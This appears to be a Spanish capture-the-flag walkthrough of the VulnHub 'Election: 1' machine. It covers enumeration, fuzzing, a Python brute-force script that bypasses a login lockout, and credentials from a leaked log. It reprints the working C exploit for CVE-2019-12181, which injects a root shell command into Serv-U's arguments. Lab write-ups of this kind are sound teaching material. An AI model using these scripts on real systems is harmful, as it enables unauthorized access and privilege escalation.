#vulnhub #ctf-machine #easy-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/election-1,503/)

## Enumeración inicial
Primeramente debemos de identificar la máquina objetivo, por lo tanto, hacemos un primer escaneo ARP utilizando la herramienta `arp-scan`:
![[Pasted image 20240822215413.png]]

La IPv4 de la máquina víctima es "192.168.159.140", ya que tiene de OUI el valor de "00:0c" que es el correspondiente a las máquinas que se importan en VMWare.

Para poder identificar de forma aproximada el sistema operativo de la máquina objetivo podemos lanzar una traza ICMP con el comando `ping`:
![[Pasted image 20240822215551.png]]

Como el TTL=64 podemos intuir que se trata de una máquina Linux.

## Nmap
Una vez identificada la IPv4 de nuestra máquina objetiva, hacemos un escaneo con `nmap` de los puertos TCP abiertos:
![[Pasted image 20240822215925.png]]

Como podemos ver solo hay 2 puertos abiertos, el puerto 22 y 80.  Por lo que realizamos un segundo escaneo para detectar la versión y servicio que corren para estos 2 puertos abiertos:
![[Pasted image 20240822220231.png]]

Podemos ver que se trata de un sistema Linux Ubuntu. Además, corre un servicio Apache de versión 2.4.29 por el puerto 80 y según el título de web parece ser la página por defecto de Apache 2.  Además, la versión de OpenSSH 7.6p1 es vulnerable a "User Enumeration" por lo que hay que tenerlo en cuenta por si se da la oportunidad de enumerar usuarios del sistema:
![[Pasted image 20240822220624.png]]

Si hacemos un último escaneo de `nmap` en el puerto 80 utilizando el script de Lua "http-enum" podemos encontrar lo siguiente:
![[Pasted image 20240822220526.png]]

## Enumeración web
Si hacemos un análisis con `whatweb` podemos ver información parecida a la que nos ha mostrado `nmap`:
![[Pasted image 20240822220808.png]]

Si accedemos a la web podemos ver la página por defecto de Apache 2:
![[Pasted image 20240822220945.png]]

Por lo que si probamos de ver el contenido de `/robots.txt` de la web vemos los siguientes directorios:
![[Pasted image 20240822221020.png]]

Si accedemos a `/phpinfo.php` podemos ver la inforación de PHP así como su versión:
![[Pasted image 20240822221130.png]]

Si nos fijamos en la información de PHP podemos ver que "file_uploads" está en "On" por lo que si conseguimos un LFI podemos conseguir RCE.

Si finalmente accedemos a `/phpmyadmin` podemos ver el panel de inicio de sesión, pero por el momento no disponemos de ninguna credencial.
![[Pasted image 20240822221452.png]]

## Fuzzing
Si hacemos *fuzzing* con `gobuster` en busca de directorios y archivos ".php" podemos encontrar lo siguiente:
![[Pasted image 20240822221830.png]]

Si accedemos a `/election/` podemos ver la siguiente página:
![[Pasted image 20240822222022.png]]

Es una página bastante estática así que podemos probar de hacer *fuzzing* con gobuster dentro de este directorio:
![[Pasted image 20240822235431.png]]

Si accedemos al directorio `election/admin` podemos ver lo siguiente:
![[Pasted image 20240822225654.png]]

Parece ser que debemos proporcionar el ID administrador, pero al introducirlo mal nos indica que tenemos solo 3 intentos:
![[Pasted image 20240822225711.png]]

Si miramos como se tramita la solicitud con `burpsuite` vemos que hay un parámetro "blocked_num" en la *cookie* que si lo quitamos nos permite enviar solicitudes sin bloquearnos:
![[Pasted image 20240822225838.png]]
![[Pasted image 20240822225904.png]]

Por lo que podemos hacer un pequeño script de Python que permita encontrar el ID correcto de admin:
```python
import requests, signal, sys

def sig_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)


header= {"X-Requested-With": "XMLHttpRequest"}

for i in range(1000, 100000):
    data = {"step": 1, "noinduk": i}
    r = requests.post("http://192.168.159.140/election/admin/ajax/login.php", data=data, headers=header)

    if "false" not in r.text:
        print("Admin ID: %d" % i)
        sys.exit(0)

```
![[Pasted image 20240822230001.png]]

Si accedemos con el ID 1234 vemos lo siguiente:
![[Pasted image 20240822230050.png]]

Que si volvemos a analizar la *request* con `burpsuite` vemos que se vuelve a utilizar el mismo control absurdo:
![[Pasted image 20240822230200.png]]

Por lo que podemos utilizar `wfuzz` para intentar adivinar la contraseña con el diccionario "rockyou.txt" pero no encontramos la contraseña.

Si seguimos haciendo fuzzing con `gobuster` de directorios dentro de `/election/admin` encontramos lo siguiente:
![[Pasted image 20240823001241.png]]


Si accedemos a `/election/admin/logs` que parece bastante crítico podemos ver lo siguiente:
![[Pasted image 20240822235522.png]]

Si nos descargamos el archivo y lo miramos vemos que hay una credencial:
![[Pasted image 20240822235631.png]]

Podemos probar de conectarnos mediante SSH con el supuesto usuario "love" y su contraseña:
![[Pasted image 20240823001357.png]]

Y efectivamente nos podemos conectar.

## Escalada de privilegios
Si accedemos al directorio `/home/love/Desktop` podemos visualizar la primera *flag*:
![[Pasted image 20240823001557.png]]

Si listamos los archivos con permisos SUID vemos el siguiente archivo:
![[Pasted image 20240823105820.png]]

Si buscamos sobre este archivo en `searchsploit` encontramos lo siguiente:
![[Pasted image 20240823110228.png]]

Por lo que si analizamos el *exploit* vemos que se trata de pasarle como argumentos una cadena especialmente diseñada para obtener una Shell como root.
```c
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

Así que compilamos el *exploit* en la máquina víctima y lo ejecutamos obtenemos *root*:
![[Pasted image 20240823110651.png]]

Y si finalmente accedemos a `/root` podemos visualizar la última *flag*:
![[Pasted image 20240823110728.png]]

___
#information-leakage #web-enumeration #abusing-suid 
___